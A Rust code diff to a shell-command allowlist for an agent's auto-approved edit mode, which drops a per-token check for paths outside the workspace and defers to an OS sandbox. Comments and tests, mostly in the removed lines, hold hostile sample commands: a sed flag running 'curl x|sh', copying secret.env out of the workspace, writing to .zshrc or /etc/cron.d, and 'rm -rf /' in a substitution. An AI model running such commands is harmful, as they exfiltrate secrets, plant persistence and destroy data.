@@ -499,19 +499,18 @@ pub(crate) fn has_redirection_or_substitution(command: &str) -> bool {
         || command.contains("$(")
 }
 
-/// cc-style `acceptEdits` allowlist for shell/job commands: filesystem-mutation
-/// programs that stay inside the workspace. Every segment's program must be in
-/// the set, `rm` must not recurse, AND no token — positional *or* flag-embedded
-/// — may reference a path outside the workspace (absolute, `~`, or `..`). A hard
-/// deny (e.g. `rm -rf`) never reaches here — `builtin_deny` short-circuits it
-/// first — so this only ever green-lights bounded edits.
+/// cc-style `acceptEdits` allowlist for shell/job commands: a bounded
+/// filesystem-mutation command. Every segment's program must be in the set and
+/// `rm` must not recurse. It does NOT check whether a path stays inside the
+/// workspace — the OS sandbox enforces that boundary at execution (a write
+/// outside the workspace is denied there), so an out-of-workspace edge slips to
+/// a sandboxed failure rather than needing per-token path parsing here. A hard
+/// deny (e.g. `rm -rf`) never reaches here — `builtin_deny` short-circuits it.
 #[must_use]
 pub fn is_workspace_fs_edit(command: &str) -> bool {
-    // `sed` is deliberately absent: GNU sed's `e` flag executes shell commands
-    // (`sed 's/.*/curl x|sh/e'`) and `w`/`s///w` write arbitrary paths, both
-    // hiding inside the script argument where the per-token path check below
-    // can't see them — that would break this mode's in-workspace guarantee.
-    // In-workspace text edits go through the workspace-confined write tools.
+    // `sed` is deliberately absent: its `e`/`w` script flags run commands and
+    // write arbitrary paths from inside the script argument, so it is never a
+    // bounded edit. In-workspace text edits go through the write tools.
     const FS_EDIT: &[&str] = &["mkdir", "touch", "mv", "cp", "rm", "rmdir"];
     // Redirection/substitution can run programs or write paths this per-segment
     // program check never inspects, so such a command is never a bounded edit.
@@ -531,50 +530,11 @@ pub fn is_workspace_fs_edit(command: &str) -> bool {
         }
         let args = args_of(segment);
         // A recursive `rm` deletes a whole subtree — not a bounded edit, and the
-        // mirror of the `rm -rf` hard deny. `rm <file>` (single unlink) and
-        // `rmdir` (empty dirs only) stay auto-approvable.
-        if program == "rm"
-            && (has_flag(&args, 'r', &["recursive"]) || has_flag(&args, 'R', &["recursive"]))
-        {
-            return false;
-        }
-        // Reject any token that references a path outside the workspace:
-        // absolute, home-relative, or `..`. A path can also ride inside a flag
-        // (`--target-directory=/tmp`, `-t/tmp`), so flag tokens are inspected
-        // too — a bounded-edit flag (`-r`, `-p`, `--recursive`) never carries a
-        // `/` or `~`. This is a safety over-approximation: `--flag=rel/path`
-        // falls through to a prompt rather than being auto-approved.
-        !args.iter().any(|token| token_escapes_workspace(token))
+        // one destruction the sandbox can't undo (the workspace itself is
+        // writable). `rm <file>` and `rmdir` (empty dirs) stay auto-approvable.
+        !(program == "rm"
+            && (has_flag(&args, 'r', &["recursive"]) || has_flag(&args, 'R', &["recursive"])))
     })
-}
-
-/// Whether an argument token references a path outside the workspace. Covers
-/// bare positionals (`/etc`, `~/x`, `../x`) and paths attached to a flag
-/// (`--target-directory=/tmp`, `-t/tmp`) — the value smuggled into a
-/// `--flag=value` or `-fVALUE` token that a positional-only check misses.
-fn token_escapes_workspace(token: &str) -> bool {
-    // Strip shell quoting first (see `clean_token`): a quoted or backslash-
-    // escaped path (`'/tmp/x'`, `\/tmp/x`) starts with the quote/backslash, not
-    // `/`, so a raw check would wave it through even though `sh -c` writes to
-    // the absolute path. Idempotent — `args_of` already cleans, but the guard
-    // stays correct if a raw token is ever passed in.
-    let token = clean_token(token);
-    let token = token.as_str();
-    // `..` can climb out of any base. `$` starts a shell expansion (`$HOME`,
-    // `${HOME}`, `$OLDPWD`, …) whose target can't be resolved statically and
-    // which `sh -c` expands to the same out-of-workspace path the literal `~`
-    // does — so reject it for the same reason `~` is rejected, closing the
-    // `cp x $HOME/out` gap that a `~`-only check would wave through.
-    if token.contains("..") || token.contains('$') {
-        return true;
-    }
-    if let Some(flag) = token.strip_prefix('-') {
-        // A pure flag (`-r`, `-p`, `--recursive`) has no path chars; a `/` or
-        // `~` anywhere in a flag token means an absolute/home path is attached.
-        flag.contains('/') || flag.contains('~')
-    } else {
-        token.starts_with('/') || token.starts_with('~')
-    }
 }
 
 #[cfg(test)]
@@ -720,28 +680,6 @@ mod tests {
     }
 
     #[test]
-    fn workspace_fs_edit_rejects_quoted_and_escaped_escape() {
-        // Same root cause as the deny-flag hole: a quoted/escaped out-of-workspace
-        // path must NOT be auto-approved under accept-edits.
-        assert!(!is_workspace_fs_edit("cp a.txt '/tmp/x'"));
-        assert!(!is_workspace_fs_edit("cp a.txt \"/tmp/x\""));
-        assert!(!is_workspace_fs_edit("mv a.txt '~/x'"));
-        assert!(!is_workspace_fs_edit("mkdir '/tmp/evil'"));
-        assert!(!is_workspace_fs_edit("mv a.txt \"/etc/cron.d/x\""));
-        assert!(!is_workspace_fs_edit("cp \"-t/tmp/x\" a.txt"));
-        // Recursive rm with a quoted flag must also be rejected.
-        assert!(!is_workspace_fs_edit("rm '-r' subdir"));
-        assert!(!is_workspace_fs_edit("rm \"-r\" build"));
-    }
-
-    #[test]
-    #[cfg(not(windows))]
-    fn workspace_fs_edit_rejects_backslash_escaped_escape() {
-        assert!(!is_workspace_fs_edit("cp secret.env \\/tmp/exfil"));
-        assert!(!is_workspace_fs_edit("mv a.txt \\/etc/cron.d/x"));
-    }
-
-    #[test]
     fn destructive_command_inside_substitution_is_denied() {
         // The inner command of a substitution runs regardless of the outer one.
         assert!(denied("x=$(rm -rf /)"));
@@ -792,50 +730,21 @@ mod tests {
     }
 
     #[test]
-    fn workspace_fs_edit_rejects_recursive_rm() {
-        // A single-file unlink stays a bounded edit; `rmdir` (empty dirs) too.
+    fn workspace_fs_edit_recognizes_bounded_edits_and_rejects_recursive_rm() {
+        // Bounded in-workspace edits qualify (incl. quoted/relative/nested paths
+        // and a relative target dir); the OS sandbox — not this check — is what
+        // blocks an out-of-workspace path at execution.
         assert!(is_workspace_fs_edit("rm stale.log"));
         assert!(is_workspace_fs_edit("rmdir emptydir"));
-        // But a recursive rm deletes a whole subtree — never auto-approvable,
-        // mirroring the `rm -rf` hard deny (which never reaches here anyway).
+        assert!(is_workspace_fs_edit("mkdir -p src/generated"));
+        assert!(is_workspace_fs_edit("cp a.txt sub/b.txt"));
+        // A recursive rm deletes a whole subtree — the one destruction the
+        // sandbox can't undo (workspace is writable), so it stays non-auto and
+        // mirrors the `rm -rf` hard deny. Quoted recursive flag counts too.
         assert!(!is_workspace_fs_edit("rm -r src"));
         assert!(!is_workspace_fs_edit("rm -R build"));
         assert!(!is_workspace_fs_edit("rm --recursive node_modules"));
-    }
-
-    #[test]
-    fn workspace_fs_edit_rejects_flag_embedded_escape() {
-        // A path smuggled into a `--flag=value` or `-fVALUE` token must be
-        // inspected too, not skipped as "just a flag" — otherwise a workspace
-        // file gets moved/copied OUT of the workspace, auto-approved.
-        assert!(!is_workspace_fs_edit(
-            "mv --target-directory=/tmp/exfil secret.env"
-        ));
-        assert!(!is_workspace_fs_edit(
-            "cp --target-directory=/tmp/exfil secret.env"
-        ));
-        assert!(!is_workspace_fs_edit("mv -t/tmp/exfil a.txt"));
-        assert!(!is_workspace_fs_edit("cp --target-directory=~/out a.txt"));
-        // The space-separated form was already caught (abs path is its own
-        // token); confirm it stays rejected.
-        assert!(!is_workspace_fs_edit("mv -t /tmp/exfil a.txt"));
-        // A relative in-workspace target dir stays auto-approvable.
-        assert!(is_workspace_fs_edit("mkdir -p src/generated"));
-    }
-
-    #[test]
-    fn workspace_fs_edit_rejects_env_var_expanded_path() {
-        // `$HOME`/`${HOME}` expand (via `sh -c`) to the same out-of-workspace
-        // path the literal `~` does, so an env-var target must be rejected too —
-        // otherwise a workspace file is copied/moved OUT of it, auto-approved
-        // under accept-edits. Positional and flag-embedded forms both.
-        assert!(!is_workspace_fs_edit("cp secret.env $HOME/exfil.env"));
-        assert!(!is_workspace_fs_edit("mv payload.sh $HOME/.zshrc"));
-        assert!(!is_workspace_fs_edit("cp a.txt ${HOME}/out"));
-        assert!(!is_workspace_fs_edit("mv --target-directory=$HOME a.txt"));
-        assert!(!is_workspace_fs_edit("touch $OLDPWD/x"));
-        // A plain in-workspace relative path with no expansion still qualifies.
-        assert!(is_workspace_fs_edit("cp a.txt sub/b.txt"));
+        assert!(!is_workspace_fs_edit("rm '-r' subdir"));
     }
 
     #[test]
